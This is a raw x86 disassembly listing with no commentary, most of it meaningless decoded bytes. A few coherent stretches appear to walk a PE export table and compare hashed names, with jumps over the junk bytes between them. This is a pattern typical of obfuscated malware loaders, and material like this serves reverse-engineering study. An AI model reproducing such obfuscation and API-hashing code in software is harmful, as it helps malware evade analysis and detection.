  4030a8:	mov    BYTE PTR ds:0xa713b59d,al
  4030ae:	and    esi,DWORD PTR [esi+0x2c]
  4030b1:	add    bl,BYTE PTR [eax]
  4030b3:	(bad)  [ecx-0x19]
  4030b6:	int    0x80
  4030b8:	mov    ds:0x894017c1,al
  4030bd:	out    0x4f,al
  4030bf:	xchg   ebp,eax
  4030c0:	cs push esi
  4030c2:	dec    ebx
  4030c3:	sbb    al,0x71
  4030c5:	mov    BYTE PTR [edx],ah
  4030c7:	sbb    al,0x61
  4030c9:	ds sti 
  4030cb:	mov    cl,ch
  4030cd:	jnp    0x403101
  4030cf:	es (bad) 
  4030d1:	mov    al,0x54
  4030d3:	sub    ebx,edx
  4030d5:	push   esi
  4030d6:	xchg   BYTE PTR [edx-0x3ee2726f],al
  4030dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030dd:	dec    ecx
  4030de:	call   0x94dc:0x99827fe8
  4030e5:	std    
  4030e6:	ror    DWORD PTR [eax],0xfa
  4030e9:	and    DWORD PTR [esp+ebp*2],edx
  4030ec:	loop   0x40312f
  4030ee:	sbb    ah,ch
  4030f0:	pop    ds
  4030f1:	pop    ds
  4030f2:	stos   DWORD PTR es:[edi],eax
  4030f3:	mov    eax,0xf1ea4a37
  4030f8:	sub    DWORD PTR [eax-0x62],ecx
  4030fb:	and    ah,BYTE PTR [ecx+0x75]
  4030fe:	mov    ecx,0x58a38bd0
  403103:	mov    eax,0x52112d85
  403108:	dec    esp
  403109:	loopne 0x4030c6
  40310b:	mov    fs,edx
  40310d:	inc    ebx
  40310e:	mov    BYTE PTR [esi+0x1d],bl
  403111:	outs   dx,BYTE PTR ds:[esi]
  403112:	or     DWORD PTR [ebp-0x4e5e562c],ebp
  403118:	pop    ss
  403119:	adc    al,0xe1
  40311b:	and    eax,DWORD PTR [eax+0x7d]
  40311e:	je     0x40316e
  403120:	cmp    cl,BYTE PTR [ebx+0x7e95b52b]
  403126:	fnsave [eax*2-0x56565747]
  40312d:	rol    BYTE PTR [ecx-0x96d9803],1
  403133:	gs mov esi,0x8c4d7e35
  403139:	fstp   DWORD PTR [esi]
  40313b:	test   al,0xc1
  40313d:	add    al,0x7f
  40313f:	(bad)  
  403140:	mov    dh,0x9a
  403142:	add    ebx,edx
  403144:	mov    eax,0x1ca97297
  403149:	or     al,bh
  40314b:	pop    esi
  40314c:	js     0x4031b8
  40314e:	test   BYTE PTR [edi+0x47da002d],al
  403154:	sahf   
  403155:	xchg   DWORD PTR [edx+0x721a94e9],esp
  40315b:	xor    ebx,DWORD PTR [edx]
  40315d:	cmp    eax,0x66148088
  403162:	push   ss
  403163:	clc    
  403164:	add    al,0xf8
  403166:	aad    0x63
  403168:	xor    ebp,esp
  40316a:	test   al,0xa4
  40316c:	cmp    eax,0x2acf58c4
  403171:	inc    edi
  403172:	sub    eax,0xa24b1ed5
  403177:	pop    edi
  403178:	data16 ins BYTE PTR es:[edi],dx
  40317a:	inc    esp
  40317b:	push   edi
  40317c:	push   ebp
  40317d:	push   ecx
  40317e:	(bad)  
  40317f:	pop    esi
  403180:	adc    dh,bh
  403182:	sbb    edx,DWORD PTR [ebp+eax*2+0xb]
  403186:	inc    ecx
  403187:	gs inc ebp
  403189:	inc    esi
  40318a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40318b:	inc    edi
  40318c:	mov    eax,ds:0xcbbec087
  403191:	mov    ecx,0xcae275bf
  403196:	dec    esi
  403197:	sar    BYTE PTR [edx],0xcb
  40319a:	sahf   
  40319b:	imul   edi,DWORD PTR [ebp+0x77b5f366],0xffffffb6
  4031a2:	adc    dl,0x52
  4031a5:	popa   
  4031a6:	rcl    DWORD PTR [ebx+0x1c],1
  4031a9:	xor    ch,ch
  4031ab:	dec    ebx
  4031ac:	fdivr  st(7),st
  4031ae:	(bad)  
  4031b0:	push   es
  4031b1:	xor    DWORD PTR [esi+eax*4-0x70e0b1f6],ebx
  4031b8:	xchg   esp,eax
  4031b9:	xchg   DWORD PTR [edx-0x35],edi
  4031bc:	or     al,0xd5
  4031be:	sub    BYTE PTR [ecx+0x39bcef67],dh
  4031c4:	push   edx
  4031c5:	fdiv   DWORD PTR [ebx-0x5e0caff8]
  4031cb:	or     al,0xd3
  4031cd:	mov    ah,0xf5
  4031cf:	or     al,0x95
  4031d1:	outs   dx,BYTE PTR es:[esi]
  4031d3:	(bad)  
  4031d4:	or     ecx,DWORD PTR [ebx+0x5a]
  4031d7:	call   0x5dc84293
  4031dc:	not    DWORD PTR [ebx-0x13]
  4031df:	out    dx,eax
  4031e0:	clc    
  4031e1:	sbb    ebx,DWORD PTR [esp+edx*4-0x4298e03]
  4031e8:	pusha  
  4031e9:	test   DWORD PTR [ebx],0x2bad847a
  4031ef:	add    DWORD PTR [edx+ebx*1+0x7d0da9de],0x56
  4031f7:	call   0x566b53c2
  4031fc:	inc    esi
  4031fd:	sbb    al,bl
  4031ff:	mov    fs,WORD PTR [eax+0x249cf055]
  403205:	shr    DWORD PTR [edx*4-0x4ff6dcfd],0x41
  40320d:	mov    ch,0x7a
  40320f:	pop    ss
  403210:	pop    ds
  403211:	sti    
  403212:	(bad)  
  403213:	lods   eax,DWORD PTR ds:[esi]
  403214:	test   BYTE PTR [eax+0x11],dh
  403217:	pop    es
  403218:	mov    WORD PTR [ebx],fs
  40321a:	shr    DWORD PTR [edx+0x69],1
  40321d:	rcl    BYTE PTR [edx],0x0
  403220:	sbb    BYTE PTR [edi],cl
  403222:	mov    esi,0x515cbb50
  403227:	fisub  DWORD PTR [eax]
  403229:	cmp    BYTE PTR [edi],ch
  40322b:	cs jbe 0x4031b5
  40322e:	shr    DWORD PTR [ebx+0xcb6c048],0x5b
  403235:	jnp    0x403289
  403237:	rcl    ah,1
  403239:	inc    ecx
  40323a:	cli    
  40323b:	iret   
  40323c:	loope  0x40322b
  40323e:	(bad)  [edx]
  403240:	test   ah,ch
  403242:	js     0x403251
  403244:	bound  esp,QWORD PTR [esi]
  403246:	push   0xffffffea
  403248:	mov    ds:0x10298bfa,eax
  40324d:	(bad)  
  40324e:	scas   al,BYTE PTR es:[edi]
  40324f:	xor    BYTE PTR [edx],dh
  403251:	jbe    0x403286
  403253:	(bad)  
  403254:	retf   
  403255:	rol    DWORD PTR [ebx+0x5],0x85
  403259:	dec    esp
  40325a:	call   DWORD PTR [eax-0x41a8fb8]
  403260:	lods   al,BYTE PTR ds:[esi]
  403261:	sbb    BYTE PTR [eax+0x4c],0xca
  403265:	fild   DWORD PTR [esi-0x14]
  403268:	repz xor esi,DWORD PTR [bx-0x5bab]
  40326e:	and    BYTE PTR [eax+0xb9967fe],dl
  403274:	stos   BYTE PTR es:[edi],al
  403275:	and    eax,0x9d846690
  40327a:	push   ds
  40327b:	adc    eax,0xdd6b856c
  403280:	dec    eax
  403281:	xchg   ebp,eax
  403282:	push   cs
  403283:	rol    esi,cl
  403285:	push   edi
  403286:	or     DWORD PTR [ecx+0x29],ebp
  403289:	dec    esp
  40328a:	mov    al,0xbc
  40328c:	cld    
  40328d:	dec    esi
  40328e:	jb     0x403300
  403290:	mov    WORD PTR [esi-0xa],cs
  403293:	push   ecx
  403294:	imul   eax,DWORD PTR [ecx-0x7d83f7a8],0xffffffb2
  40329b:	sub    DWORD PTR [ecx+eax*4],ecx
  40329e:	in     eax,dx
  40329f:	jg     0x403283
  4032a1:	mov    ebp,0x4ccc1405
  4032a6:	jecxz  0x4032d2
  4032a8:	mov    ecx,0xb7828c98
  4032ad:	std    
  4032ae:	add    BYTE PTR [eax-0xc],0xbc
  4032b2:	and    ch,BYTE PTR [ebx]
  4032b4:	sahf   
  4032b5:	cwde   
  4032b6:	mov    ebp,0x96ee12ef
  4032bb:	push   es
  4032bc:	push   0x38
  4032be:	(bad)  
  4032bf:	push   DWORD PTR [esi-0x3e]
  4032c2:	icebp  
  4032c3:	cld    
  4032c4:	gs ins DWORD PTR es:[edi],dx
  4032c6:	or     ah,BYTE PTR [ebx+edx*8]
  4032c9:	fdiv   QWORD PTR [ecx+0x2ca2ee7]
  4032cf:	in     al,0x36
  4032d1:	or     eax,DWORD PTR [edx-0x71]
  4032d4:	repz cmp al,0xa3
  4032d7:	call   0x6c4a:0x4aeab766
  4032de:	jl     0x4032df
  4032e0:	scas   al,BYTE PTR es:[edi]
  4032e1:	sbb    eax,0x20ba4834
  4032e6:	pop    ds
  4032e7:	inc    esi
  4032e8:	stc    
  4032e9:	nop
  4032ea:	ins    BYTE PTR es:[edi],dx
  4032eb:	mov    ch,0x47
  4032ed:	out    0x32,al
  4032ef:	push   ss
  4032f0:	stos   DWORD PTR es:[edi],eax
  4032f1:	popa   
  4032f2:	les    ebp,FWORD PTR [eax-0x6f]
  4032f5:	ins    BYTE PTR es:[edi],dx
  4032f6:	aam    0xde
  4032f8:	aas    
  4032f9:	popf   
  4032fa:	mov    cl,0xfa
  4032fc:	ds xchg cl,dh
  4032ff:	mov    dl,0x29
  403301:	add    ah,BYTE PTR [ebx+0x3e50eb53]
  403307:	xchg   esp,eax
  403308:	fs icebp 
  40330a:	scas   al,BYTE PTR es:[edi]
  40330b:	jno    0x403367
  40330d:	mov    eax,0x9d2bda45
  403312:	mov    ds:0x571f801a,al
  403317:	jecxz  0x4032dd
  403319:	lahf   
  40331a:	push   esi
  40331b:	mov    bh,ah
  40331d:	dec    eax
  40331e:	jb     0x4032ea
  403320:	push   eax
  403321:	sbb    ch,ah
  403323:	mov    ds:0x3c63396,al
  403328:	(bad)  
  403329:	cmp    DWORD PTR [ecx],eax
  40332b:	je     0x4040c9
  403331:	mov    ecx,DWORD PTR [ebp-0x14]
  403334:	mov    eax,DWORD PTR [ebp-0x8]
  403337:	mov    eax,DWORD PTR [eax]
  403339:	mov    eax,DWORD PTR [eax+0x3c]
  40333c:	lea    ecx,[ecx*8+0x78]
  403343:	add    eax,ecx
  403345:	mov    ecx,DWORD PTR [ebp-0x8]
  403348:	mov    ecx,DWORD PTR [ecx]
  40334a:	mov    eax,DWORD PTR [eax+ecx*1]
  40334d:	mov    DWORD PTR [ebp-0x1c],eax
  403350:	mov    eax,DWORD PTR [ebp+0x8]
  403353:	xor    eax,esi
  403355:	add    eax,edi
  403357:	mov    DWORD PTR [ebp-0x20],eax
  40335a:	mov    eax,DWORD PTR [ebp+0x8]
  40335d:	mov    ecx,DWORD PTR [ebp-0x1c]
  403360:	jmp    0x4035ff
  403365:	(bad)  
  403366:	cmp    al,0xcf
  403368:	cmp    al,0xd9
  40336a:	rcr    ecx,cl
  40336c:	fidiv  DWORD PTR [ecx-0x5e3dc34a]
  403372:	sub    al,0xab
  403374:	not    BYTE PTR [eax]
  403376:	sbb    bh,BYTE PTR [eax+0x78]
  403379:	(bad)  
  40337a:	jle    0x4033f4
  40337c:	js     0x40339a
  40337e:	je     0x4033e8
  403380:	xor    BYTE PTR [edi+0x3b],bl
  403383:	cld    
  403384:	mov    ch,0x8
  403386:	arpl   WORD PTR [ebp+0x17],di
  403389:	cmp    eax,0xeee0d81a
  40338e:	inc    ecx
  40338f:	xchg   esi,eax
  403390:	dec    ecx
  403391:	push   eax
  403392:	enter  0x8200,0xd0
  403396:	ins    BYTE PTR es:[edi],dx
  403397:	lods   eax,DWORD PTR ds:[esi]
  403398:	mov    ?,WORD PTR [edx+eax*1+0xa0f1b4]
  40339f:	shl    BYTE PTR [eax+esi*1-0x38],1
  4033a3:	iret   
  4033a4:	and    BYTE PTR [ecx],al
  4033a6:	mov    bh,0xd8
  4033a8:	cdq    
  4033a9:	and    edx,ebp
  4033ab:	out    dx,al
  4033ac:	xor    eax,0xcbde47e1
  4033b1:	dec    DWORD PTR [edi]
  4033b3:	out    dx,al
  4033b4:	sbb    dh,BYTE PTR [ebx+0x51]
  4033b7:	sub    ebx,ecx
  4033b9:	jg     0x403355
  4033bb:	iret   
  4033bc:	icebp  
  4033bd:	push   ebx
  4033be:	push   ebx
  4033bf:	(bad)  
  4033c1:	mov    bh,0x3e
  4033c3:	(bad)  
  4033c4:	out    0x56,eax
  4033c6:	pop    ds
  4033c7:	sbb    ecx,DWORD PTR [edx+0x52]
  4033ca:	push   ss
  4033cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033cc:	add    eax,0xac8eb061
  4033d1:	pushf  
  4033d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033d3:	add    al,0xa0
  4033d5:	xchg   ebp,eax
  4033d6:	xor    eax,0x9914947d
  4033db:	mov    bl,0x1f
  4033dd:	sub    ebp,DWORD PTR [esi-0x66]
  4033e0:	dec    edi
  4033e1:	mov    ecx,0x749c731f
  4033e6:	je     0x40341e
  4033e8:	xlat   BYTE PTR ds:[ebx]
  4033e9:	(bad)  
  4033ea:	icebp  
  4033eb:	xchg   esi,eax
  4033ec:	jbe    0x4033f3
  4033ee:	adc    al,0xa2
  4033f0:	(bad)  
  4033f1:	(bad)  
  4033f3:	mov    bh,dh
  4033f5:	dec    edi
  4033f6:	retf   0xe124
  4033f9:	sub    eax,DWORD PTR [ebx-0x1dc54de4]
  4033ff:	scas   al,BYTE PTR es:[edi]
  403400:	mov    BYTE PTR [edx],ah
  403402:	sbb    al,0x1f
  403404:	bound  ebp,QWORD PTR [ecx-0x34967bed]
  40340a:	dec    esi
  40340b:	ja     0x40339c
  40340d:	mov    eax,0x9c65784a
  403412:	mov    ss:0xc8b90741,al
  403418:	popa   
  403419:	int3   
  40341a:	push   ds
  40341b:	xchg   ebx,eax
  40341c:	xchg   esi,eax
  40341d:	scas   eax,DWORD PTR es:[edi]
  40341e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40341f:	pop    edx
  403420:	adc    al,0xa0
  403422:	(bad)  
  403423:	out    dx,al
  403424:	cmp    al,0xcd
  403426:	jecxz  0x4033e1
  403428:	test   eax,0x288276c8
  40342d:	cli    
  40342e:	jecxz  0x403471
  403430:	sar    BYTE PTR [ecx],cl
  403432:	lock adc ah,dl
  403435:	cs jae 0x4033f0
  403438:	dec    edx
  403439:	mul    BYTE PTR [ebx-0x6a]
  40343c:	aas    
  40343d:	cmp    al,0xa6
  40343f:	in     al,0xc
  403441:	stos   BYTE PTR es:[edi],al
  403442:	stos   BYTE PTR es:[edi],al
  403443:	in     eax,dx
  403444:	xor    bh,BYTE PTR [ecx]
  403446:	je     0x4033f3
  403448:	adc    eax,DWORD PTR [eax+0x44993a99]
  40344e:	sub    dl,BYTE PTR [eax-0x1b78e31c]
  403454:	nop
  403455:	inc    edx
  403456:	jl     0x4033fa
  403458:	mov    dl,0x46
  40345a:	mov    edx,0x3dd77fe0
  40345f:	push   eax
  403460:	pop    edi
  403461:	inc    edi
  403462:	and    eax,0xe621126e
  403467:	jne    0x40345e
  403469:	das    
  40346a:	btc    DWORD PTR [ebp-0x6ad01aa9],edi
  403471:	(bad)  
  403472:	dec    ebx
  403473:	sub    eax,0x6d96eabc
  403478:	xchg   BYTE PTR [edi+ebx*8],bh
  40347b:	call   0x3fb8:0x9faf7527
  403482:	test   dl,0x30
  403485:	test   BYTE PTR [esi-0x8],cl
  403488:	xor    BYTE PTR [esi+edi*4-0x8b4527d],cl
  40348f:	je     0x4034cb
  403491:	mov    eax,0x86395aa4
  403496:	ds out 0xac,al
  403499:	pop    ds
  40349a:	gs std 
  40349c:	mov    edi,DWORD PTR [eax]
  40349e:	inc    ebx
  40349f:	mov    WORD PTR [ebp+0x4e],gs
  4034a2:	xchg   BYTE PTR [ebx-0x39],ch
  4034a5:	mov    DWORD PTR [ecx+edx*4-0x17340b80],edi
  4034ac:	in     al,0xd5
  4034ae:	paddw  mm5,QWORD PTR ds:[edx]
  4034b2:	popf   
  4034b3:	inc    edi
  4034b4:	(bad)  
  4034b5:	jecxz  0x4034c1
  4034b7:	out    dx,al
  4034b8:	mov    al,ds:0x80e60865
  4034bd:	ds loop 0x403486
  4034c0:	or     eax,0xb5e5850c
  4034c5:	jno    0x4034c0
  4034c7:	mov    ds:0x7d9250da,al
  4034cc:	mov    eax,ds:0xb3939a56
  4034d1:	sbb    eax,0x5f5c7b57
  4034d6:	xlat   BYTE PTR ds:[ebx]
  4034d7:	daa    
  4034d8:	xchg   esp,eax
  4034d9:	mov    bh,0xcd
  4034db:	sub    al,0x84
  4034dd:	add    DWORD PTR [ecx],0x5ea2df84
  4034e3:	(bad)  
  4034e4:	ret    
  4034e5:	or     eax,0x168d577c
  4034ea:	call   0x875e3337
  4034ef:	and    ecx,DWORD PTR [ecx]
  4034f1:	mov    ds:0x5bc33723,al
  4034f6:	mov    WORD PTR [eax-0x433aa2a0],?
  4034fc:	or     BYTE PTR [esi-0x6a],0x57
  403500:	push   cs
  403501:	adc    al,al
  403503:	add    ch,BYTE PTR [edx-0x422ea48c]
  403509:	es pop ss
  40350b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40350c:	dec    ebx
  40350d:	inc    eax
  40350e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40350f:	shl    DWORD PTR [edx+0xb],0x48
  403513:	lahf   
  403514:	mov    ds:0x78c88645,al
  403519:	bound  eax,QWORD PTR [eax]
  40351b:	cmp    eax,esp
  40351d:	adc    BYTE PTR [edi],dh
  40351f:	daa    
  403520:	push   ecx
  403521:	sbb    eax,0xb2f72b30
  403526:	sub    al,0x4d
  403528:	jae    0x40353b
  40352a:	mov    edi,0x6a0afceb
  40352f:	xchg   ecx,eax
  403530:	jb     0x40357a
  403532:	les    ecx,FWORD PTR [ebx]
  403534:	shr    BYTE PTR fs:[esp+ecx*8],1
  403538:	mov    edi,0xc904f4d9
  40353d:	mov    ebp,0x8df5f897
  403542:	push   es
  403543:	or     ebx,ebp
  403545:	and    BYTE PTR [edi],bh
  403547:	cli    
  403548:	inc    BYTE PTR [ebp+0x7a]
  40354b:	ins    DWORD PTR es:[edi],dx
  40354c:	inc    esi
  40354d:	mov    bh,0xff
  40354f:	and    al,dl
  403551:	adc    al,0xe8
  403553:	(bad)  
  403555:	into   
  403556:	neg    bl
  403558:	jae    0x403523
  40355a:	mov    dh,0xe8
  40355c:	sbb    DWORD PTR [edx+eiz*2-0x68],esi
  403560:	dec    edx
  403561:	scas   eax,DWORD PTR es:[edi]
  403562:	jmp    DWORD PTR [eax+ebx*1]
  403565:	lea    edx,[edx-0x75]
  403568:	or     esp,DWORD PTR [eax+0x3a77956a]
  40356e:	jl     0x4035b1
  403570:	and    al,0xc7
  403572:	sub    al,0xfe
  403574:	mov    WORD PTR [edx-0x43],?
  403577:	daa    
  403578:	sbb    cl,al
  40357a:	jecxz  0x403573
  40357c:	sub    ah,cl
  40357e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40357f:	pushf  
  403580:	pusha  
  403581:	cmp    ecx,DWORD PTR ds:0x380d6ed7
  403587:	retf   
  403588:	inc    eax
  403589:	mov    al,ds:0x6fc9b5a
  40358e:	retf   
  40358f:	cs inc ebp
  403591:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  403593:	imul   ch
  403595:	dec    esi
  403596:	add    dh,bl
  403598:	cmp    edi,DWORD PTR [ecx-0x7e]
  40359b:	jge    0x4035c8
  40359d:	repz and dh,ah
  4035a0:	mov    eax,ds:0x5f8a27bf
  4035a5:	adc    bl,bh
  4035a7:	shl    BYTE PTR [ebp+0x1c46e2f7],1
  4035ad:	bound  esi,QWORD PTR [esi+ecx*1]
  4035b0:	test   eax,0x96c1a715
  4035b5:	and    BYTE PTR [edi+eiz*8-0x51eb07e5],ah
  4035bc:	aam    0x92
  4035be:	inc    edx
  4035bf:	mov    ah,0xe1
  4035c1:	out    0x61,al
  4035c3:	popa   
  4035c4:	cli    
  4035c5:	lds    esp,FWORD PTR [edx]
  4035c7:	fdiv   QWORD PTR [ebx+0x2e]
  4035ca:	pop    esi
  4035cb:	pop    edi
  4035cc:	sub    ah,bl
  4035ce:	mov    ch,0x8
  4035d0:	scas   al,BYTE PTR es:[edi]
  4035d1:	pop    es
  4035d2:	inc    ecx
  4035d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035d4:	(bad)  
  4035d5:	int3   
  4035d6:	stc    
  4035d7:	psubw  mm5,mm6
  4035da:	cs (bad) 
  4035dd:	outs   dx,BYTE PTR ds:[esi]
  4035de:	(bad)  
  4035df:	int    0x62
  4035e1:	mov    ebx,0x9b36f7ca
  4035e6:	(bad)  
  4035e7:	xor    al,0xc2
  4035e9:	outs   dx,BYTE PTR ds:[esi]
  4035ea:	and    bh,BYTE PTR [ebx+eax*2]
  4035ed:	mov    eax,0x90d0e9b5
  4035f2:	xor    DWORD PTR [eax],ebp
  4035f4:	and    dl,BYTE PTR [edx]
  4035f6:	push   ebx
  4035f7:	xchg   ebp,eax
  4035f8:	mov    eax,0xe16bf4a3
  4035fd:	jo     0x4035d3
  4035ff:	xor    eax,esi
  403601:	add    eax,edi
  403603:	cmp    ecx,eax
  403605:	je     0x404380
  40360b:	mov    eax,DWORD PTR [ebp-0x8]
  40360e:	mov    ecx,DWORD PTR [ebp-0x1c]
  403611:	add    ecx,DWORD PTR [eax]
  403613:	mov    DWORD PTR [ebp-0x20],ecx
  403616:	mov    eax,DWORD PTR [ebp-0x20]
  403619:	mov    ecx,DWORD PTR [ebp-0x8]
  40361c:	mov    eax,DWORD PTR [eax+0xc]
  40361f:	mov    ecx,DWORD PTR [ecx]
  403621:	jmp    0x4038c0
  403626:	xlat   BYTE PTR ds:[ebx]
  403627:	aas    
  403628:	mov    al,0xd6
  40362b:	(bad)
  40362e:	fwait
  40362f:	clc    
  403630:	mov    BYTE PTR ds:0x1457155d,0x96
  403637:	sbb    BYTE PTR [eax+0x78],bh
  40363a:	(bad)  
  40363b:	jle    0x4036b5
  40363d:	js     0x403661
  40363f:	xor    al,0x8c
  403641:	xchg   esp,eax
  403642:	and    bl,bh
  403644:	adc    ch,bl
  403646:	addr16 dec esi
  403648:	add    DWORD PTR [ebx-0x1c7bd4b9],eax
  40364e:	sti    
  40364f:	ror    BYTE PTR [edi+ebx*4-0x44b53aaf],1
  403656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403657:	repnz xor dh,al
  40365a:	mov    esi,0x9e15fdd
  40365f:	dec    ecx
  403660:	ins    DWORD PTR es:[edi],dx
  403661:	sar    BYTE PTR ds:0x77e6b28b,cl
  403667:	pop    eax
  403668:	mov    dh,0x52
  40366a:	jg     0x403683
  40366c:	xchg   DWORD PTR [ebp-0x445e8fab],ebp
  403672:	dec    ecx
  403673:	xor    bl,al
  403675:	out    0xa1,al
  403677:	mov    al,0xed
  403679:	pop    ebx
  40367a:	cs mov ebp,0xa9bafac5
  403680:	aam    0x11
  403682:	sahf   
  403683:	sub    edx,0x497efab8
  403689:	pop    ecx
  40368a:	and    edx,DWORD PTR [esi+0x5b]
  40368d:	mov    WORD PTR [ebx],?
  40368f:	inc    esi
  403690:	push   0xffffffa4
  403692:	xchg   ebx,eax
  403693:	in     al,0x2b
  403695:	cmc    
  403696:	xor    edx,DWORD PTR [eax-0x7c]
  403699:	hlt    
  40369a:	mov    ss,WORD PTR [esp+edx*4+0x3f]
  40369e:	pop    edx
  40369f:	inc    ebp
  4036a0:	pop    ebx
  4036a1:	push   ds
  4036a2:	int3   
  4036a3:	fcomi  st,st(1)
  4036a5:	ja     0x403703
  4036a7:	push   0x7a59ccd
  4036ac:	xchg   DWORD PTR ds:0xc1247ef4,ebx
  4036b2:	pop    ds
  4036b3:	inc    esp
  4036b4:	rcl    bh,0x20
  4036b7:	ret    
  4036b8:	jae    0x403739
  4036ba:	add    DWORD PTR [ebp+0x2699951c],eax
  4036c0:	mov    al,ds:0xe2269b50
  4036c5:	inc    ebp
  4036c6:	sbb    al,0xc4
  4036c8:	ret    
  4036c9:	fsubp  st(0),st
  4036cb:	loope  0x403673
  4036cd:	push   ss
  4036ce:	(bad)  
  4036cf:	leave  
  4036d0:	stc    
  4036d1:	bound  eax,QWORD PTR [edi+eiz*1-0x56f76e16]
  4036d8:	inc    ebp
  4036d9:	jne    0x403660
  4036db:	inc    ecx
  4036dc:	hlt    
  4036dd:	push   esp
  4036de:	adc    dh,BYTE PTR [edx-0x61]
  4036e1:	jae    0x403686
  4036e3:	xlat   BYTE PTR es:[ebx]
  4036e5:	scas   al,BYTE PTR es:[edi]
  4036e6:	inc    edx
  4036e7:	stos   BYTE PTR es:[edi],al
  4036e8:	lods   eax,DWORD PTR ds:[esi]
  4036e9:	and    BYTE PTR [ebp-0x299073f3],cl
  4036ef:	ins    DWORD PTR es:[edi],dx
  4036f0:	mov    cs,WORD PTR ss:[edi-0x30e347fb]
  4036f7:	mov    ebx,0xad673b68
  4036fc:	push   ebp
  4036fd:	cmp    BYTE PTR [esi],ah
  4036ff:	ffree  st(1)
  403701:	retf   0xad2d
  403704:	add    DWORD PTR [ebp+eiz*2-0x2f4c2aff],0x7a09216e
  40370f:	repnz imul ecx,DWORD PTR [esi+0x5a8b1bd7],0x5dd58f9d
  40371a:	clc    
  40371b:	dec    esp
  40371c:	push   0xf7632c3e
  403721:	add    al,0x82
  403723:	jne    0x403750
  403725:	cmp    ecx,esi
  403727:	sub    bh,ah
  403729:	jmp    0xba5:0xe28b2c8d
  403730:	sti    
  403731:	cdq    
  403732:	pop    ebx
  403733:	arpl   WORD PTR [esi+ebx*2],cx
  403736:	sub    eax,0x1d93f2b1
  40373b:	push   esi
  40373c:	push   ebp
  40373d:	addr16 push 0x58
  403740:	adc    eax,ebx
  403742:	out    dx,al
  403743:	cmp    BYTE PTR [ecx+0x558a0f2d],dl
  403749:	ins    BYTE PTR es:[edi],dx
  40374a:	fdivr  QWORD PTR [esi+0x653b7128]
  403750:	jns    0x40374a
  403752:	ins    BYTE PTR es:[edi],dx
  403753:	test   DWORD PTR [ebp-0x14],0xa7123f7d
  40375a:	(bad)  
  40375b:	xor    cl,BYTE PTR [eax-0x36]
  40375e:	cwde   
  40375f:	sbb    dh,BYTE PTR ds:0xbe73707a
  403765:	sbb    BYTE PTR [ecx],al
  403767:	dec    ecx
  403768:	hlt    
  403769:	test   DWORD PTR [ecx+ecx*8+0x49b95b49],eax
  403770:	retf   0x9521
  403773:	xlat   BYTE PTR ds:[ebx]
  403774:	mov    edx,?
  403776:	inc    edi
  403777:	pushf  
  403778:	in     eax,0x69
  40377a:	mov    ebx,DWORD PTR [esi-0x1b265605]
  403780:	mov    cl,0x5a
  403782:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403783:	mov    dl,0x61
  403785:	dec    eax
  403786:	iret   
  403787:	fwait
  403788:	push   esp
  403789:	fs or  BYTE PTR cs:[ebx-0x21],dh
  40378e:	pop    ebx
  40378f:	ja     0x4037c6
  403791:	scas   eax,DWORD PTR es:[edi]
  403792:	cmp    dl,bh
  403794:	add    BYTE PTR [edx],al
  403796:	ss mov esi,0xc8a55c61
  40379c:	xor    bl,BYTE PTR [ebx]
  40379e:	mov    bl,0xd7
  4037a0:	xor    DWORD PTR [ebx],esi
  4037a2:	and    DWORD PTR [edi+ecx*2+0x2fd35207],esi
  4037a9:	mov    ebx,0x8a5fb10d
  4037ae:	adc    edx,esi
  4037b0:	and    BYTE PTR [edi],dl
  4037b2:	fst    DWORD PTR [edi-0x4e]
  4037b5:	(bad)  
  4037b6:	iret   
  4037b7:	or     eax,0xb6aa2c36
  4037bc:	push   0x9feefe2d
  4037c1:	xor    al,0x37
  4037c3:	jae    0x4037dc
  4037c5:	inc    esp
  4037c6:	mov    bl,0xad
  4037c8:	mov    dl,0x43
  4037ca:	aaa    
  4037cb:	xlat   BYTE PTR ds:[ebx]
  4037cc:	mov    esp,0x7e154333
  4037d1:	pushf  
  4037d2:	sub    BYTE PTR [ecx+0x3972870a],cl
  4037d8:	jmp    0xe2da:0x879168f5
  4037df:	lock lahf 
  4037e1:	les    esi,FWORD PTR [esi]
  4037e3:	in     al,0x9f
  4037e5:	inc    esp
  4037e6:	addr16 mov al,0xc8
  4037e9:	imul   DWORD PTR [edi+esi*1+0x0]
  4037ed:	cmp    BYTE PTR [ebx+0x65],dh
  4037f0:	in     al,dx
  4037f1:	(bad)  
  4037f2:	retf   
  4037f3:	jno    0x4037d4
  4037f5:	push   esi
  4037f6:	mov    cl,dl
  4037f8:	adc    ah,bh
  4037fa:	mov    edi,0x41065f5c
  4037ff:	xchg   esi,eax
  403800:	cmp    DWORD PTR [ecx-0x20],0xf58fcc73
  403807:	retf   
  403808:	ds mov dl,0xc2
  40380b:	(bad)  
  40380c:	sub    BYTE PTR [edi-0x30f8a76a],dl
  403812:	fild   WORD PTR [edx-0x3d]
  403815:	adc    al,bl
  403817:	mov    ecx,0xef17ccbb
  40381c:	scas   eax,DWORD PTR es:[edi]
  40381d:	loop   0x4037b7
  40381f:	in     al,0x4b
  403821:	mov    bh,0xf8
  403823:	jge    0x40380a
  403825:	mov    ebx,0x1d653440
  40382a:	inc    ebp
  40382b:	stc    
  40382c:	xor    esi,ebx
  40382e:	push   0x35
  403830:	test   eax,0xa8933034
  403835:	je     0x403870
  403837:	cmp    eax,0xbb45597f
  40383c:	(bad)
  403841:	aas    
  403842:	sub    BYTE PTR [ecx],dh
  403844:	(bad)  
  403845:	sti    
  403846:	jne    0x403878
  403848:	pop    edx
  403849:	call   0x3f9e:0x2bf7258c
  403850:	fistp  WORD PTR [ebx+0x7c]
  403853:	jmp    0x403835
  403855:	sub    DWORD PTR [esi+0x3b88dd68],esi
  40385b:	add    ch,BYTE PTR [ebp+0x7e0a8339]
  403861:	repz push ds
  403863:	mov    ebp,0xe043cdfd
  403868:	adc    dl,BYTE PTR [ecx+0x146301f6]
  40386e:	mov    ds:0xf63c5d79,al
